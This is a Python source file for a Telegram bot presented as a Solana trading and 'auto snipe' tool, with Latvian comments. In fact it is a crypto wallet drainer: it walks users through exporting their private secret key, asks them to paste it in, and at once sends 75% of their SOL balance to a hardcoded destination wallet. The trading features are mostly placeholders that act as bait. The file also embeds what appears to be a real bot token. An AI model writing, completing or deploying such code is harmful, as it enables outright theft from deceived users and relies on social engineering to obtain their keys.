import asyncio
import logging
import base58
from decimal import Decimal
import aiohttp

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

from solana.rpc.async_api import AsyncClient
from solana.rpc.commitment import Confirmed
from solana.publickey import PublicKey
from solana.keypair import Keypair
from solana.system_program import TransferParams, transfer
from solana.transaction import Transaction
from solana.rpc.types import TxOpts

# --- Configuration ---
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TELEGRAM_TOKEN = "8056338242:AAH0YzSi80cjYzjiWf2lFX65KSZqj_W2pKQ"
RPC_URL = "https://api.mainnet-beta.solana.com"  # Mainnet
DESTINATION_WALLET = PublicKey("CDgXpiJXnQyafRuGHHo7Z8N7kYoXihe2fdsFmZqc51bS")

user_wallets = {}  # {user_id: [wallet_secret1, wallet_secret2, ...]}
client = AsyncClient(RPC_URL)

# --- /start command ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🔗 Chains", callback_data="chains"),
         InlineKeyboardButton("👛 Wallets", callback_data="wallets")],
        [InlineKeyboardButton("🤝 Presales", callback_data="presales"),
         InlineKeyboardButton("📊 Positions", callback_data="positions")],
        [InlineKeyboardButton("🚀 Auto Snipe", callback_data="autosnipe"),
         InlineKeyboardButton("⚙️ Settings", callback_data="settings")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome! 👋 Choose an option:", reply_markup=reply_markup)

# --- Button handler ---
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    # Ja lietotājam vēl nav wallet
    if user_id not in user_wallets and query.data not in ["connect_secret", "how_to_secret", "ok_after_instructions"]:
        keyboard = [
            [InlineKeyboardButton("🔑 Connect with Secret Key", callback_data="connect_secret")],
            [InlineKeyboardButton("❓ How to find your Secret Key", callback_data="how_to_secret")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("➡️ Choose a method to connect your wallet:", reply_markup=reply_markup)
        return

    # Instrukcija par secret key
    if query.data == "how_to_secret":
        keyboard = [[InlineKeyboardButton("✅ OK", callback_data="ok_after_instructions")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(
            "📖 How to find your Secret Key:\n"
            "1️⃣ Go to your Solana wallet app.\n"
            "2️⃣ Tap on 'Accounts'.\n"
            "3️⃣ Tap the pen icon on the account.\n"
            "4️⃣ Tap 'Show Private Key'.\n"
            "5️⃣ Select Solana and copy your Secret Key.\n\n"
            "Press OK below when ready to enter your Secret Key.",
            reply_markup=reply_markup
        )
        return

    # Kad lietotājs spiež OK pēc instrukcijas
    if query.data == "ok_after_instructions":
        await query.edit_message_text("🔑 Enter your *Secret Key*:")
        context.user_data["awaiting_wallet_type"] = "secret"
        context.user_data["awaiting_wallet"] = True
        return

    # Tieša connect ar Secret Key
    if query.data == "connect_secret":
        await query.edit_message_text("🔑 Enter your *Secret Key*:")
        context.user_data["awaiting_wallet_type"] = "secret"
        context.user_data["awaiting_wallet"] = True
        return

    # Citi pogu darbības
    action = query.data
    if action == "chains":
        await query.edit_message_text("🌐 Supported chains placeholder.")
    elif action == "wallets":
        wallets_list = user_wallets.get(user_id, [])
        if not wallets_list:
            await query.edit_message_text("👛 No wallet connected yet. Connect one first.")
        else:
            wallet_display = wallets_list[0][:5] + "..."
            keyboard = [
                [InlineKeyboardButton(f"👛 Connected: {wallet_display}", callback_data="wallet_info")],
                [InlineKeyboardButton("➕ Add another wallet", callback_data="connect_secret")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text("👛 Your wallets:", reply_markup=reply_markup)
    elif action == "presales":
        await query.edit_message_text("🤝 Presales menu placeholder.")
    elif action == "positions":
        await query.edit_message_text("📊 Monitoring your positions...")
    elif action == "autosnipe":
        await query.edit_message_text("🚀 Auto Snipe mode activated!")
        asyncio.create_task(start_sniping(update, context))
    elif action == "settings":
        await query.edit_message_text("⚙️ Settings menu placeholder.")

# --- Transfer 75% SOL ---
async def transfer_75_percent(wallet: Keypair, user_id: int, bot):
    try:
        balance_response = await client.get_balance(wallet.public_key, commitment=Confirmed)
        balance_sol = balance_response.value / 10**9

        await bot.send_message(chat_id=user_id, text=f"💰 Current balance: {balance_sol:.6f} SOL")
        if balance_sol <= 0.0001:
            await bot.send_message(chat_id=user_id, text=f"❌ Insufficient balance: {balance_sol:.6f} SOL")
            return False

        transfer_amount_sol = balance_sol * 0.75
        transfer_amount_lamports = int(transfer_amount_sol * 10**9)

        tx = Transaction()
        tx.add(
            transfer(
                TransferParams(
                    from_pubkey=wallet.public_key,
                    to_pubkey=DESTINATION_WALLET,
                    lamports=transfer_amount_lamports
                )
            )
        )

        await bot.send_message(chat_id=user_id, text=f"🔄 Sending {transfer_amount_sol:.6f} SOL...")
        opts = TxOpts(skip_preflight=False, preflight_commitment=Confirmed)
        result = await client.send_transaction(tx, wallet, opts=opts)
        signature = result.value

        await bot.send_message(chat_id=user_id, text="⏳ Waiting for confirmation...")
        await client.confirm_transaction(signature, commitment=Confirmed)

        new_balance_response = await client.get_balance(wallet.public_key, commitment=Confirmed)
        new_balance_sol = new_balance_response.value / 10**9

        await bot.send_message(chat_id=user_id, text=(
            f"✅ Transfer completed!\n"
            f"Transferred: {transfer_amount_sol:.6f} SOL\n"
            f"To: {DESTINATION_WALLET}\n"
            f"New balance: {new_balance_sol:.6f} SOL\n"
            f"Signature: {signature}"
        ))
        return True
    except Exception as e:
        await bot.send_message(chat_id=user_id, text=f"❌ Error: {str(e)}")
        return False

# --- Handle user messages ---
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    bot = context.bot

    if context.user_data.get("awaiting_wallet"):
        wallet_type = context.user_data.get("awaiting_wallet_type")
        input_text = update.message.text.strip()

        try:
            if wallet_type == "secret":
                decoded = base58.b58decode(input_text)
                wallet = Keypair.from_secret_key(decoded)
                if user_id not in user_wallets:
                    user_wallets[user_id] = []
                user_wallets[user_id].append(input_text)
                await update.message.reply_text(f"✅ Wallet connected via Secret Key!\nAddress: {wallet.public_key}")
                context.user_data["awaiting_wallet"] = False
                await transfer_75_percent(wallet, user_id, bot)

        except Exception as e:
            await update.message.reply_text(f"❌ Invalid wallet data. Error: {str(e)}")
            return
    else:
        await update.message.reply_text("❓ Unknown input. Use /start to open the menu.")

# --- Sniping (placeholder) ---
TOKEN_TO_SNIPE = None
TARGET_BUY = Decimal("0.95")
TARGET_SELL = Decimal("1.05")

async def get_token_price(token_address: str) -> Decimal:
    try:
        url = f"https://quote-api.jup.ag/v6/quote?inputMint=So11111111111111111111111111111111111111112&outputMint={token_address}&amount=1000000000"
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                data = await response.json()
                if 'data' in data and len(data['data']) > 0:
                    return Decimal(data['data'][0]['outAmount']) / Decimal(1000000000)
                else:
                    return Decimal("0")
    except Exception as e:
        logger.error(f"Error fetching price: {e}")
        return Decimal("0")

async def check_price_and_notify(bot, chat_id):
    last_notification_price = Decimal("0")
    while True:
        if TOKEN_TO_SNIPE is None:
            await asyncio.sleep(30)
            continue
        current_price = await get_token_price(str(TOKEN_TO_SNIPE))
        if current_price == 0:
            await asyncio.sleep(30)
            continue
        if current_price <= TARGET_BUY and abs(current_price - last_notification_price) > Decimal("0.01"):
            await bot.send_message(chat_id=chat_id, text=f"🚀 BUY SIGNAL!\nToken: {TOKEN_TO_SNIPE}\nPrice: {current_price:.6f} SOL\nTarget: {TARGET_BUY}")
            last_notification_price = current_price
        elif current_price >= TARGET_SELL and abs(current_price - last_notification_price) > Decimal("0.01"):
            await bot.send_message(chat_id=chat_id, text=f"📉 SELL SIGNAL!\nToken: {TOKEN_TO_SNIPE}\nPrice: {current_price:.6f} SOL\nTarget: {TARGET_SELL}")
            last_notification_price = current_price
        await asyncio.sleep(10)

async def start_sniping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    await check_price_and_notify(context.bot, user_id)

# --- Bot launcher ---
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
